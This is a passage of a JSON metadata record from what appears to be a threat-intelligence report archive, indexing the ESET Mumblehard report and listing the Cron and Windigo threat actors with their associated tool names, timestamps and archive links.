            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2015/04/mumblehard.pdf"
    ],
    "report_names": [
        "mumblehard.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041630,
    "ts_creation_date": 1430240361,
    "ts_modification_date": 1430240366,
    "files": {
        "pdf": "https://archive.orkl.eu/b4e8fe336e0611e81ea6a7ad24a4f47279a074a5.pdf",
        "text": "https://archive.orkl.eu/b4e8fe336e0611e81ea6a7ad24a4f47279a074a5.txt",
        "img": "https://archive.orkl.eu/b4e8fe336e0611e81ea6a7ad24a4f47279a074a5.jpg"
    }
}